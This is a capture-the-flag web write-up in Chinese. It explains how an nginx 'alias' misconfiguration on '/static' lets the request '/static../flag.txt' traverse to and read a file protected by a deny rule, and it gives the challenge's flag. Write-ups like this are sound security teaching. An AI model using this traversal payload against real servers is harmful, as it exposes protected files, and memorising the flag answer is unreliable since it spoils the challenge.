#Web 

## 題目

**Cookie Image**
給了一個網址，點開來：
![[W1-6_web.png|580]]
完整的 `nginx.conf`
```bash
events {}

http {
    server {
        listen 80;
        root /app;

        location /static {
            alias /app/static/;
        }

        location = /flag.txt {
            deny all;
        }
    }
}
```

## 解題
1. `flag.txt` 被保護起來了，無法直接存取（403 Forbidden）
2. `config` 設定中，當瀏覽器請求 `/static/` 時，Nginx 會去伺服器本機的 `/app/static/` 找檔案
   ```js
   location /static {
		alias /app/static/;
	}
   ```
   -> 這邊找檔案不會被禁
3. 網址輸入 `http://chals1:20005/static../flag.txt`，ngnix 會變成
   ```js
    location /static../flag.txt {
		alias /app/static/../flag.txt;
	}
   ```
   得到
   ![[W1-6_flag.png|394]]
4. flag = `CTF{cookie_image_1de9b397bea599374b46a619}`